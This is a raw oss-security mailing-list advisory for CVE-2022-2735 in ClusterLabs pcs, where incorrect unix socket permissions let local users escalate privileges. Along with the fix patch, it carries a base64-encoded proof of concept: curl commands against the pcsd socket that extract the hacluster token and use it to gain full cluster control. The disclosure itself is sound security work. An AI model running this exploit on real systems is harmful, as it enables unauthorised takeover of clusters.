Received: (qmail 21984 invoked by uid 550); 1 Sep 2022 14:09:38 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 13783 invoked from network); 1 Sep 2022 14:01:30 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=redhat.com;
	s=mimecast20190719; t=1662040878;
	h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
	 to:to:cc:cc:mime-version:mime-version:content-type:content-type;
	bh=XvnZwkxBTLC0R+LmY8sUO4Uoj0TkQAJPj1eFL1BOTzw=;
	b=G09xfoktXkxrL3HkXhQiqmBkX1B6nwhHpF94P8J+15P7MeSFCta6ycBs+665FMj3bw7pFy
	aWWD2HlDGBAQbMSb5YwGlsirla5Yo/8GZnw5BjOo/ohkf8T6/Wf/x5b/2N7H3U5CfkTrH0
	7Lxr4NfAoyWjV8t0wrHLWmTIyjdqe00=
X-MC-Unique: JKNWU4ZQP0STk63l6JRHZQ-1
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20210112;
        h=cc:to:subject:message-id:date:from:mime-version:x-gm-message-state
         :from:to:cc:subject:date;
        bh=TRcaEwFQKadmyItBwvqA5RAdZkhvQEeCKAJCnxahjtU=;
        b=O5FyCxPsex8iD5Za+tWJW7oHDMw4apYiK8P2n+CVj4malZNT7YQSsOnKBp+r5NNHFc
         HVQlUgb2GfQWWc+Wosztr1PnELdoJ7DrvEFpoZIDSxVjsT7dwiF6oAbxxVi/doL0Eybp
         /CdYUakwb1R15FmkvydC4QVyzz3T8/EgezoCpVr0tJCoDdRarZ39S5Gw+0/8EPVPmLsi
         gL2t69iznaoIb3pf/1mh9JV6uUtFEf42N+ctXdfZcYdKUSlnOvC64TqUk5SEiqm9/xdt
         5zvqkJMQeDIr85WvjLDkL4agzfX7ByDeguVxJG5V+AC2LgDCLpsO0xVhBoNXuH2zhKUm
         1UWQ==
X-Gm-Message-State: ACgBeo0P6tyuQ+s3f9e+S47w3ElMjjILUTcoZkNmCszX4XWjP3v+lgXm
	l2FNCH45Ncf4zCdwHFxFPNIIftTGX/TDfW5T81xT2RMO81UfYbcdG1e3F7UKUlr0VYMZMStTB5Y
	fQdzEvYeWEvSPu7mi+LAPYMwQdSm8Mb0kpdGyPE0MrCJh
X-Received: by 2002:a0d:e5c3:0:b0:329:bd79:63c with SMTP id o186-20020a0de5c3000000b00329bd79063cmr23287303ywe.56.1662040874677;
        Thu, 01 Sep 2022 07:01:14 -0700 (PDT)
X-Google-Smtp-Source: AA6agR4zik64i0VmYvXr4DIHNzId9noZhMoYjdpTEYXiwxPf9qcrTzdaXTf7ldy4d+vLbzPXep6jXg4Xy3YaEsX93TY=
X-Received: by 2002:a0d:e5c3:0:b0:329:bd79:63c with SMTP id
 o186-20020a0de5c3000000b00329bd79063cmr23287254ywe.56.1662040874289; Thu, 01
 Sep 2022 07:01:14 -0700 (PDT)
MIME-Version: 1.0
From: Tej Rathi <trathi@redhat.com>
Date: Thu, 1 Sep 2022 19:30:58 +0530
Message-ID: <CAFqpC6zUc9DYKnBv3OBAsjOE9bgfGVqvoCW3B3f=CY43WfDVQA@mail.gmail.com>
To: oss-security@lists.openwall.com
Cc: Ondrej Mular <omular@redhat.com>
X-Mimecast-Spam-Score: 0
X-Mimecast-Originator: redhat.com
Content-Type: multipart/mixed; boundary="000000000000ea8d5705e79e0b84"
Subject: [oss-security] ClusterLabs/PCS: [CVE-2022-2735] Obtaining an authentication token
 for hacluster user leads to privilege escalation.

--000000000000ea8d5705e79e0b84
Content-Type: multipart/alternative; boundary="000000000000ea8d5405e79e0b82"

--000000000000ea8d5405e79e0b82
Content-Type: text/plain; charset="UTF-8"

Hello,

A security issue was discovered in the ClusterLabs/PCS project. This is
CVE-2022-2735, assigned by Red Hat.
(https://github.com/ClusterLabs/pcs)


*ROOT CAUSE & IMPACT:*
*------------------------------------*

It is caused by incorrect permissions on a unix socket used for internal
communication between pcs daemons. Reproducer below demonstrates a
privilege escalation by obtaining authentication token for hacluster
user. With the hacluster token, an attacker has complete control over
the cluster managed by pcs.

CVSS Base Score [HIGH]: 8.4/CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H


*AFFECTED VERSIONS:*

*---------------------------------*

pcs upstream is affected since version 0.10.5 [1][2]. This means that all
0.10.x versions starting from 0.10.5 including the latest 0.10 branch
release 0.10.14 are affected. And all 0.11.x versions are affected as well.

POC and PATCH are in the attachment.


*CREDITS:*

*--------------*

The issue was discovered by Ondrej Mular (Senior Software Engineer, Red Hat)


*REFERENCES:*
*---------------------*

[1]: https://github.com/ClusterLabs/pcs/releases/tag/0.10.5
[2]:
https://github.com/ClusterLabs/pcs/blob/main/CHANGELOG.md#0105---2020-03-18


- - - - - - - - - - - - - - - -

Thanks & Regards,

TEJ RATHI

Associate Product Security Engineer | PSIRT

Product Security Engineering, Red Hat.

--000000000000ea8d5405e79e0b82
Content-Type: text/html; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

<div dir=3D"ltr">Hello,<br><br>A security issue was discovered in the Clust=
erLabs/PCS project. This is CVE-2022-2735, assigned by Red Hat.<br>(<a href=
=3D"https://github.com/ClusterLabs/pcs">https://github.com/ClusterLabs/pcs<=
/a>)<br><br><br><div><b>ROOT CAUSE &amp; IMPACT:</b></div><div><b>---------=
---------------------------</b></div><div><br></div>It is caused by incorre=
ct permissions on a unix socket used for internal<br>communication between =
pcs daemons. Reproducer below demonstrates a<br>privilege escalation by obt=
aining authentication token for hacluster<br>user. With the hacluster token=
, an attacker has complete control over<br>the cluster managed by pcs.<br><=
br>CVSS Base Score [HIGH]: 8.4/CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H=
<br><br><br><div><b>AFFECTED VERSIONS:</b></div><div><b>-------------------=
--------------<br></b></div><div><b><br></b></div>pcs upstream is affected =
since version 0.10.5 [1][2]. This means that all 0.10.x versions starting f=
rom 0.10.5 including the latest 0.10 branch release 0.10.14 are affected. A=
nd all 0.11.x versions are affected as well.<br><br>POC and PATCH are in th=
e attachment.<br><br><br><div><b>CREDITS:</b></div><div><b>--------------<b=
r></b></div><div><b><br></b></div>The issue was discovered by Ondrej Mular =
(Senior Software Engineer, Red Hat)<br><br><br><div><b>REFERENCES:</b></div=
><div><b>---------------------</b><br></div><br>[1]: <a href=3D"https://git=
hub.com/ClusterLabs/pcs/releases/tag/0.10.5">https://github.com/ClusterLabs=
/pcs/releases/tag/0.10.5</a><br><div>[2]: <a href=3D"https://github.com/Clu=
sterLabs/pcs/blob/main/CHANGELOG.md#0105---2020-03-18">https://github.com/C=
lusterLabs/pcs/blob/main/CHANGELOG.md#0105---2020-03-18</a></div><div><br><=
/div><div><br></div><div>- - - - - - - - - - - - - - - -<br></div><div><p s=
tyle=3D"color:rgb(0,0,0);margin:0px;padding:0px"><span style=3D"font-family=
:tahoma,sans-serif"><font size=3D"2"><span style=3D"color:rgb(170,170,170);=
margin:0px">Thanks &amp; Regards,</span></font></span></p><p style=3D"color=
:rgb(0,0,0);font-family:RedHatText,sans-serif;font-weight:bold;margin:0px;p=
adding:0px;font-size:14px"><span></span><font size=3D"2">TEJ=C2=A0<span>RAT=
HI</span></font></p><p style=3D"color:rgb(0,0,0);font-size:12px;margin:0px"=
><span><font face=3D"tahoma, sans-serif">Associate Product Security Enginee=
r | PSIRT</font></span></p><p style=3D"color:rgb(0,0,0);font-size:12px;marg=
in:0px"><span><font face=3D"tahoma, sans-serif">Product Security Engineerin=
g, Red Hat.</font></span></p></div><br></div>

--000000000000ea8d5405e79e0b82--

--000000000000ea8d5705e79e0b84
Content-Type: application/octet-stream; name=patch
Content-Disposition: attachment; filename=patch
Content-Transfer-Encoding: base64
Content-ID: <f_l7j34auo0>
X-Attachment-Id: f_l7j34auo0

RnJvbSBkMzFiNzY1OTkzYjYzNTFlNTFlMmJiZDhiMjExY2ZiMmYxMmEyOWU3
IE1vbiBTZXAgMTcgMDA6MDA6MDAgMjAwMQpGcm9tOiBUb21hcyBKZWxpbmVr
IDx0b2plbGluZUByZWRoYXQuY29tPgpEYXRlOiBUaHUsIDQgQXVnIDIwMjIg
MTM6MjE6NDQgKzAyMDAKU3ViamVjdDogW1BBVENIXSBmaXggcnVieSBzb2Nr
ZXQgcGVybWlzc2lvbnMKCi0tLQogcGNzZC9yc2VydmVyLnJiIHwgMjAgKysr
KysrKysrKysrKysrKysrKysKIDEgZmlsZSBjaGFuZ2VkLCAyMCBpbnNlcnRp
b25zKCspCgpkaWZmIC0tZ2l0IGEvcGNzZC9yc2VydmVyLnJiIGIvcGNzZC9y
c2VydmVyLnJiCmluZGV4IGUyYzVlMmExLi44MTE1ZGFmZSAxMDA2NDQKLS0t
IGEvcGNzZC9yc2VydmVyLnJiCisrKyBiL3Bjc2QvcnNlcnZlci5yYgpAQCAt
Nyw2ICs3LDI2IEBAIHJlcXVpcmUgJ3RoaW4nCgogcmVxdWlyZSAnc2V0dGlu
Z3MucmInCgorbW9kdWxlIFRoaW4KKyAgbW9kdWxlIEJhY2tlbmRzCisgICAg
Y2xhc3MgVW5peFNlcnZlciA8IEJhc2UKKyAgICAgIGRlZiBjb25uZWN0Cisg
ICAgICAgIGF0X2V4aXQgeyByZW1vdmVfc29ja2V0X2ZpbGUgfSAjIEluIGNh
c2UgaXQgY3Jhc2hlcworICAgICAgICBvbGRfdW1hc2sgPSBGaWxlLnVtYXNr
KDBvMDc3KQorICAgICAgICBiZWdpbgorICAgICAgICAgIEV2ZW50TWFjaGlu
ZS5zdGFydF91bml4X2RvbWFpbl9zZXJ2ZXIoQHNvY2tldCwgVW5peENvbm5l
Y3Rpb24sICZtZXRob2QoOmluaXRpYWxpemVfY29ubmVjdGlvbikpCisgICAg
ICAgICAgIyBIQUNLIEV2ZW50TWFjaGluZS5zdGFydF91bml4X2RvbWFpbl9z
ZXJ2ZXIgZG9lc24ndCByZXR1cm4gdGhlIGNvbm5lY3Rpb24gc2lnbmF0dXJl
CisgICAgICAgICAgIyAgICAgIHNvIHdlIGhhdmUgdG8gZ28gaW4gdGhlIGlu
dGVybmFsIHN0dWZmIHRvIGZpbmQgaXQuCisgICAgICAgIEBzaWduYXR1cmUg
PSBFdmVudE1hY2hpbmUuaW5zdGFuY2VfZXZhbHtAYWNjZXB0b3JzLmtleXMu
Zmlyc3R9CisgICAgICAgIGVuc3VyZQorICAgICAgICAgIEZpbGUudW1hc2so
b2xkX3VtYXNrKQorICAgICAgICBlbmQKKyAgICAgIGVuZAorICAgIGVuZAor
ICBlbmQKK2VuZAorCisKIGRlZiBwYWNrX3Jlc3BvbnNlKHJlc3BvbnNlKQog
ICByZXR1cm4gWzIwMCwge30sIFtyZXNwb25zZS50b19qc29uLnRvX3N0cl1d
CiBlbmQKLS0KMi4zMS4xCg==

--000000000000ea8d5705e79e0b84
Content-Type: application/octet-stream; name=poc
Content-Disposition: attachment; filename=poc
Content-Transfer-Encoding: base64
Content-ID: <f_l7j34auu1>
X-Attachment-Id: f_l7j34auu1

UE9DIFtDVkUtMjAyMi0yNzM1XQoKClN0ZXBzIHRvIHJlcHJvZHVjZToKClt0
ZXN0dXNlckByaGVsOTAtbm9kZTEgfl0kIHBjcyBzdGF0dXMKV2FybmluZzog
VW5hYmxlIHRvIHJlYWQgdGhlIGtub3duLWhvc3RzIGZpbGU6IE5vIHN1Y2gg
ZmlsZSBvciBkaXJlY3Rvcnk6ICcvaG9tZS90ZXN0dXNlci8ucGNzL2tub3du
LWhvc3RzJwpFcnJvcjogVW5hYmxlIHRvIGF1dGhlbnRpY2F0ZSBhZ2FpbnN0
IHRoZSBsb2NhbCBwY3NkLiBSdW4gdGhlIHNhbWUgY29tbWFuZCBhcyByb290
IG9yIGF1dGhlbnRpY2F0ZSB5b3Vyc2VsZiB0byB0aGUgbG9jYWwgcGNzZCB1
c2luZyBjb21tYW5kICdwY3MgY2xpZW50IGxvY2FsLWF1dGgnCgpbdGVzdHVz
ZXJAcmhlbDkwLW5vZGUxIH5dJCBwY3MgY2xpZW50IGxvY2FsLWF1dGggLXUg
dGVzdHVzZXIgLXAgMTIzNApFcnJvcjogQWNjZXNzIGRlbmllZAoKW3Rlc3R1
c2VyQHJoZWw5MC1ub2RlMSB+XSQgY3VybCAtWCBQT1NUIC0tdW5peC1zb2Nr
ZXQgL3Zhci9ydW4vcGNzZC1ydWJ5LnNvY2tldCAtLWhlYWRlciAiWF9QQ1NE
X1RZUEU6IHNpbmF0cmFfcmVtb3RlIiBodHRwOi9yZW1vdGUvcmVtb3RlL2F1
dGg/dXNlcm5hbWU9aGFjbHVzdGVyIHwgcHl0aG9uMyAtYyAiaW1wb3J0IHN5
cywganNvbiwgYmFzZTY0OyBwcmludChiYXNlNjQuYjY0ZGVjb2RlKGpzb24u
bG9hZChzeXMuc3RkaW4pWydib2R5J10pLmRlY29kZSgpKSIgPiB0b2tlbi50
bXAKICAlIFRvdGFsICAgICUgUmVjZWl2ZWQgJSBYZmVyZCAgQXZlcmFnZSBT
cGVlZCAgIFRpbWUgICAgVGltZSAgICAgVGltZSAgQ3VycmVudAogICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICBEbG9hZCAgVXBsb2FkICAgVG90
YWwgICBTcGVudCAgICBMZWZ0ICBTcGVlZAoxMDAgICAxNTkgICAgMCAgIDE1
OSAgICAwICAgICAwICA3OTUwMCAgICAgIDAgLS06LS06LS0gLS06LS06LS0g
LS06LS06LS0gIDE1NWsKClt0ZXN0dXNlckByaGVsOTAtbm9kZTEgfl0kIGNh
dCB0b2tlbi50bXAKOWQzMjBiMmMtMTFlNy00MGM0LWJlN2ItMTI3OTVhMWRj
MzllCgpPbmNlIHdlIGhhdmUgdGhlIHRva2VuLCB3ZSBjYW4gZWl0aGVyIHVz
ZSBpdCBmb3IgY2FsbGluZyBSRVNUIEFQSSBvciBzYXZlIGl0IGludG8gdXNl
cuKAmXMgY29uZmlndXJhdGlvbiBhbmQgdXNlIHBjcyBjb21tYW5kcwoKW3Rl
c3R1c2VyQHJoZWw5MC1ub2RlMSB+XSQgbWtkaXIgLXAgfi8ucGNzOyBleHBv
cnQgVE9LRU49YGNhdCB0b2tlbi50bXBgOyBlY2hvIC1lICd7ImZvcm1hdF92
ZXJzaW9uIjoxLCJkYXRhX3ZlcnNpb24iOjEsImtub3duX2hvc3RzIjp7Imxv
Y2FsaG9zdCI6eyJkZXN0X2xpc3QiOlt7ImFkZHIiOiJsb2NhbGhvc3QiLCJw
b3J0IjoyMjI0fV0sInRva2VuIjoiJFRPS0VOIn19fScgfCBlbnZzdWJzdCA+
IH4vLnBjcy9rbm93bi1ob3N0cwoKW3Rlc3R1c2VyQHJoZWw5MC1ub2RlMSB+
XSQgcGNzIHN0YXR1cwpDbHVzdGVyIG5hbWU6IHRlc3RjbHVzdGVyCkNsdXN0
ZXIgU3VtbWFyeToKICAqIFN0YWNrOiBjb3Jvc3luYwogICogQ3VycmVudCBE
QzogbG9jYWxob3N0ICh2ZXJzaW9uIDIuMS4yLTQuZWw5LWFkYTVjM2IzNmUy
KSAtIHBhcnRpdGlvbiB3aXRoIHF1b3J1bQogICogTGFzdCB1cGRhdGVkOiBU
aHUgQXVnICA0IDE0OjA4OjUyIDIwMjIKICAqIExhc3QgY2hhbmdlOiAgVGh1
IEp1biAxNiAxNTozMDowMCAyMDIyIGJ5IGhhY2x1c3RlciB2aWEgY2liYWRt
aW4gb24gbG9jYWxob3N0CiAgKiAxIG5vZGUgY29uZmlndXJlZAogICogNCBy
ZXNvdXJjZSBpbnN0YW5jZXMgY29uZmlndXJlZAoKTm9kZSBMaXN0OgogICog
T25saW5lOiBbIGxvY2FsaG9zdCBdCgpGdWxsIExpc3Qgb2YgUmVzb3VyY2Vz
OgogICogZHVtbXkgICAgICAgKG9jZjpwYWNlbWFrZXI6RHVtbXkpOiAgIFN0
YXJ0ZWQgbG9jYWxob3N0CiAgKiBkdW1teTIgICAgICAob2NmOnBhY2VtYWtl
cjpEdW1teSk6ICAgU3RhcnRlZCBsb2NhbGhvc3QKICAqIGR1bW15MyAgICAg
IChvY2Y6cGFjZW1ha2VyOkR1bW15KTogICBTdGFydGVkIGxvY2FsaG9zdAog
ICogQ2xvbmUgU2V0OiBkdW1teTQtY2xvbmUgW2R1bW15NF06CiAgICAqIFN0
YXJ0ZWQ6IFsgbG9jYWxob3N0IF0KCkRhZW1vbiBTdGF0dXM6CiAgY29yb3N5
bmM6IGFjdGl2ZS9kaXNhYmxlZAogIHBhY2VtYWtlcjogYWN0aXZlL2Rpc2Fi
bGVkCiAgcGNzZDogYWN0aXZlL2VuYWJsZWQK

--000000000000ea8d5705e79e0b84--

